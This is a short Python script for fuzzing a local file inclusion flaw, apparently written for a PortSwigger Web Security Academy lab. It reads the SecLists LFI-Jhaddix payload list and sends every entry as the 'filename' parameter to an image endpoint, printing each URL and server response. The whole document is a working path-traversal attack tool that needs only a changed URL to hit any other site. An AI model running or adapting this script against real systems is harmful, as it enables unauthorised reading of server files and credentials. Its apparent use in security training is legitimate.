import requests


#the variable payload bellow contains the payloads that will be using to exploit the LFI vulnerability. In this case, I used the LFI-Jhaddix.txt.
payload = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"

with open(payload,"r") as f:
    for line in f:

        
        #the variable vulnerable_path is the path that you suspect that is vulnerable, and the line variable is the variable which loads each payload.
        vulnerable_path = "https://0abe001b04859dac8250392f0015003d.web-security-academy.net/image?filename="+line


        #the variable response will get the http response in form of bit and decodes it
        response = requests.get(vulnerable_path, timeout=5).content.decode()

        print("Vulnerable path: ",vulnerable_path,"\n\n")

        print("Response: ",response,"\n\n")

        print("############# END ###################\n\n")


